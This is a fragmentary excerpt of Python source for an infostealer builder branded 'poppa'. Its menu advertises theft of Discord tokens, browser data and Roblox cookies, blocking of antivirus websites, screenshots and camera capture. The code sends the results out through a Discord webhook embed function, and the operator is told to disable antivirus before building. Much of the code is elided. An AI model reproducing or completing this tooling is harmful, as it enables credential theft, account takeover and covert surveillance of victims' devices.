...
username_embed = 'poppa'
footer_embed = {
        "text": f"poppa | {current_time_day_hour()}",
        }
footer_text = f"poppa | {current_time_day_hour()}"
...
"""
    ...
    def embed_system(webhook_url, title, fields, color, footer, username):
...
```""", "inline": False},
    ...
    embed_system(webhook_url, title, fields, color_embed, footer_embed, username_embed)
'''
...
▀█████████▀  ███    ███ ▀█████████▀  ▀█████████▀  ▀███████████   ▀▀███▀▀▀▀███▀  ▀███████████ ███        ▀▀█████▄    
 ...
 ▄████▀       ▀██████▀   ▄████▀       ▄████▀        ███    █▀      ███    █▀      ███    █▀  ████████▀    ███   ▀█▀ 
    ...
    {green}╔═════════════╦═══════════════╦═══════════════╦═══════════════╦══════════════════╦════════════╦════════════════╗
    {green}║ {green}System Info{green} ║ {green}Discord Token{green} ║ {green}Browser Steal{green} ║ {green}Roblox Cookie{green} ║ {green}Block AV Website{green} ║ {green}Screenshot{green} ║ {green}Camera Capture{green} ║
    {green}╚═════════════╩═══════════════╩═══════════════╩═══════════════╩══════════════════╩════════════╩════════════════╝

{red}[!]{green} | File detected by the antivirus, but be aware that there is no backdoor!
{red}[!]{green} | Only your webhook will be taken into account, no other webhook will be added to your Stealer.
{red}[!]{green} | Deactivate your antivirus so that no files are deleted after your build.""")
choice = (f"{INPUT}Press Enter To Customise")
...
def choose_icon():
    ...
    try:
        if sys.platform.startswith("win"):
            root = tk.Tk()
            root.iconbitmap('Img/poppa_icon.ico')
            root.withdraw()
...
file_text_relative = f'./OT-dno/BS/{name_file}.txt'
file_text = os.path.abspath(file_text_relative)

file_python_relative = f'./OT-dno/BS/{name_file}.py'
file_python = os.path.abspath(file_python_relative)

path_destination_relative = "./OT-dno/BS"
